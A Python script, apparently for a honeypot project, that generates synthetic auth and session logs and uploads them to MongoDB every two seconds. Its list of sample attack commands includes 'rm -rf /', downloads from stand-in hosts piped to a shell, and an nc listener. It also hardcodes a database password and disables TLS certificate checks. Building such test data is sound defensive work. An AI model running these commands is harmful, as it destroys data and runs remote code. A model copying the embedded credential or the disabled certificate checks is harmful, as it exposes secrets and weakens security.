import time
import random
import uuid
from datetime import datetime
from pymongo import MongoClient

# Define a list of suspicious commands
suspicious_commands = [
    "rm -rf /",
    "chmod 777 /etc/shadow",
    "wget http://malicious.com/malware.sh -O- | sh",
    "curl http://bad-site.com/attack | bash",
    "useradd -m hacker",
    "echo 'hacked' > /var/www/html/index.html",
    "sudo su",
    "nc -lvp 4444",
    "python -c 'import os; os.system(\"rm -rf *\")'",
    "rm -rf /home/user/*"
]

# Function to generate a random IP from reserved documentation ranges
def generate_ip():
    ranges = [(192, 0, 2), (198, 51, 100), (203, 0, 113)]
    base = random.choice(ranges)
    return f"{base[0]}.{base[1]}.{base[2]}.{random.randint(1,254)}"

# Function to generate a fake log record
def generate_fake_log(log_type):
    # log_type: "auth" or "session"
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    duration = random.randint(0, 60)
    session_id = str(uuid.uuid4())
    source_ip = generate_ip()
    destination_ip = generate_ip()
    source_port = random.randint(1000,8000)
    destination_port = random.choice([50, 999])
    protocol = random.choice(["http", "https", "ssh"])
    num_auth_attempts = random.randint(0, 5)
    # With 30% probability, include a suspicious command; otherwise, empty.
    command = random.choice(suspicious_commands) if random.random() < 0.3 else ""
    
    return {
        "timestamp": timestamp,
        "duration": duration,
        "session_id": session_id,
        "source_ip": source_ip,
        "source_port": source_port,
        "destination_ip": destination_ip,
        "destination_port": destination_port,
        "protocol": protocol,
        "num_auth_attempts": num_auth_attempts,
        "command": command,
        "log_type": log_type
    }

# 1️⃣ Connect to MongoDB (using your connection string)
client = MongoClient("mongodb+srv://gurleenbatra14:caT3UWUhsicwY3Wo@gurleen.tsoo9.mongodb.net/?tls=true&tlsAllowInvalidCertificates=true&tlsVersion=TLS1_2")
db = client["Honey"]
collection = db["records"]

# 2️⃣ Loop for 1000 iterations, generating and uploading logs every 2 seconds
for i in range(1000):
    print(f"Iteration {i+1}: Generating and uploading logs...")
    
    # Generate one auth log and one session log
    auth_log = generate_fake_log("auth")
    session_log = generate_fake_log("session")
    
    combined_data = [auth_log, session_log]
    
    try:
        collection.insert_many(combined_data)
        print("✅ Logs uploaded successfully!")
    except Exception as e:
        print(f"Error uploading logs: {e}")
    time.sleep(2)
